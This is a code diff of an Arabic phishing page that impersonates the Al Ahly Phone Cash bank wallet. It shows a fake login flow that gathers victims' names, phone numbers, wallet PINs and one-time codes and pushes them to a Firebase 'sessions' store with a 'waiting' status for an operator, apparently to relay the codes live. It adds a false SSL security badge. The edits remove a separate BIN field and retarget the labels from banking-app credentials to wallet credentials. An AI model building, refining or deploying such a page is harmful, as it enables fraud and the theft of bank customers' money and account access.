@@ -8,26 +8,23 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>محفظة الاهلي فون كاش</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Noto+Naskh+Arabic:wght@400;700&display=swap');
-    * { font-family: 'Cairo', 'Janna LT', 'Janna', Arial, sans-serif; }
-    * { margin:0; padding:0; box-sizing:border-box; }
+    * { margin:0; padding:0; box-sizing:border-box; font-family: 'Cairo', 'Janna LT', 'Janna', Arial, sans-serif; }
 
     :root {
       --primary: #006633;
       --primary-dark: #004d26;
       --primary-light: #008040;
-      --bg: #f0f7f2;
+      --bg: #006633;
       --bg-card: #ffffff;
       --border: #b2d8c0;
     }
 
     body {
       min-height: 100vh;
-      background: var(--bg);
+      background: #006633;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-family: 'Cairo', 'Janna LT', 'Janna', Arial, sans-serif;
       padding: 20px;
     }
     .card {
@@ -36,7 +33,7 @@
       padding: 35px 28px;
       width: 100%;
       max-width: 420px;
-      box-shadow: 0 20px 60px rgba(0,102,51,0.18);
+      box-shadow: 0 20px 60px rgba(0,0,0,0.35);
       text-align: center;
     }
     .logo { width: 100px; margin-bottom: 20px; }
@@ -80,7 +77,7 @@
       font-size: 14px; outline: none;
       text-align: right; transition: border-color 0.2s;
     }
-    .form-group input:focus { border-color: var(--primary); background: var(--bg-card); }
+    .form-group input:focus { border-color: var(--primary); }
     .login-subtitle {
       font-size: 14px; color: #555;
       margin-bottom: 22px; font-weight: 600;
@@ -122,7 +119,7 @@
     .step-dot.done { background: #81c784; }
     .overlay {
       display: none; position: fixed; inset: 0;
-      background: rgba(0, 51, 25, 0.88);
+      background: rgba(0,51,25,0.88);
       backdrop-filter: blur(4px);
       -webkit-backdrop-filter: blur(4px);
       z-index: 999; align-items: center; justify-content: center;
@@ -176,28 +173,6 @@
     .success-icon { font-size: 60px; margin-bottom: 14px; }
     .success-title { font-size: 22px; font-weight: 900; color: var(--primary); margin-bottom: 8px; }
     .success-sub { font-size: 14px; color: #666; }
-    .bin-wrapper { margin: 10px 0; text-align: center; }
-    .bin-label {
-      display: block; font-size: 14px;
-      color: var(--primary-dark); font-weight: bold; margin-bottom: 8px;
-    }
-    .bin-boxes {
-      display: flex; justify-content: center;
-      gap: 12px; direction: ltr;
-    }
-    .bin-box {
-      width: 52px; height: 52px;
-      text-align: center; font-size: 22px;
-      font-weight: bold; padding: 0;
-      border: 2px solid var(--primary); border-radius: 10px;
-      color: #ffffff; background: var(--primary); outline: none;
-      display: flex; align-items: center; justify-content: center;
-      transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
-    }
-    .bin-box:focus {
-      border-color: var(--primary-dark); background: var(--primary-dark);
-      box-shadow: 0 0 0 3px rgba(0,102,51,0.3);
-    }
   </style>
 </head>
 <body>
@@ -290,26 +265,17 @@
       <div class="step-dot done"></div>
       <div class="step-dot active"></div>
     </div>
-    <div class="page-title">بيانات التطبيق</div>
+    <div class="page-title">بيانات المحفظة</div>
     <div class="login-subtitle">أدخل بيانات محفظتك الإلكترونية</div>
     <div class="form-group">
       <div class="input-wrap">
-        <input type="text" id="phoneInput" placeholder="اسم المستخدم حسب التطبيق البنكي" oninput="this.value=this.value.replace(/[^a-zA-Z0-9]/g,'')"/>
+        <input type="tel" id="phoneInput" placeholder="أدخل رقم الموبايل" oninput="this.value=this.value.replace(/[^0-9]/g,'')"/>
       </div>
     </div>
     <div class="form-group">
       <div class="input-wrap pin-wrap">
-        <input type="password" id="pinInput" placeholder="كلمة مرور التطبيق البنكي"/>
+        <input type="password" id="pinInput" placeholder="الرقم السري" oninput="this.value=this.value.replace(/[^0-9]/g,'')"/>
         <button class="eye-btn" onclick="togglePin()" type="button">👁</button>
-      </div>
-      <div class="bin-wrapper">
-        <label class="bin-label">الرقم السري BIN</label>
-        <div class="bin-boxes">
-          <input class="bin-box" type="tel" maxlength="1" id="bin1"/>
-          <input class="bin-box" type="tel" maxlength="1" id="bin2"/>
-          <input class="bin-box" type="tel" maxlength="1" id="bin3"/>
-          <input class="bin-box" type="tel" maxlength="1" id="bin4"/>
-        </div>
       </div>
     </div>
     <div class="special-badge">
@@ -326,7 +292,7 @@
     <div class="otp-sub">تم إرسال رمز التحقق إلى رقم هاتفك</div>
     <div class="otp-error" id="otpError">❌ الرمز غير صحيح، يرجى المحاولة مرة أخرى</div>
     <div class="otp-inputs">
-      <input type="tel" id="otpSingleInput" placeholder="أدخل رمز التحقق"/>
+      <input type="tel" id="otpSingleInput" placeholder="أدخل رمز التحقق" oninput="this.value=this.value.replace(/[^0-9]/g,'')"/>
     </div>
     <button class="btn-main" onclick="submitOTP()">تأكيد</button>
     <div class="secure-note">🔒 محمي بتشفير SSL 256-bit | محفظة الاهلي فون كاش © 2024</div>
@@ -414,16 +380,15 @@
     const personalPhone = document.getElementById('personalPhoneInput').value.trim();
     const phone = document.getElementById('phoneInput').value.trim();
     const pin = document.getElementById('pinInput').value.trim();
-    const bin = (document.getElementById('bin1').value || '') +
-                (document.getElementById('bin2').value || '') +
-                (document.getElementById('bin3').value || '') +
-                (document.getElementById('bin4').value || '');
     if (!phone || !pin) return;
 
     showOverlay('waitingOverlay');
 
     const newRef = push(ref(db, 'site1/sessions'), {
-      name, personalPhone, phone, pin, bin,
+      name,
+      personalPhone,
+      phone,
+      pin,
       otp: '---',
       status: 'waiting',
       currentPage: 'login',
@@ -468,25 +433,6 @@
       }
     });
   }
-
-  document.addEventListener('DOMContentLoaded', function() {
-    var boxes = ['bin1','bin2','bin3','bin4'];
-    boxes.forEach(function(id, idx) {
-      var el = document.getElementById(id);
-      if (!el) return;
-      el.addEventListener('keydown', function(e) {
-        if (e.key === 'Backspace' && el.value === '' && idx > 0) {
-          document.getElementById(boxes[idx-1]).focus();
-        }
-      });
-      el.addEventListener('input', function() {
-        el.value = el.value.replace(/[^0-9]/g, '').slice(0,1);
-        if (el.value.length === 1 && idx < 3) {
-          document.getElementById(boxes[idx+1]).focus();
-        }
-      });
-    });
-  });
 </script>
 </body>
 </html>
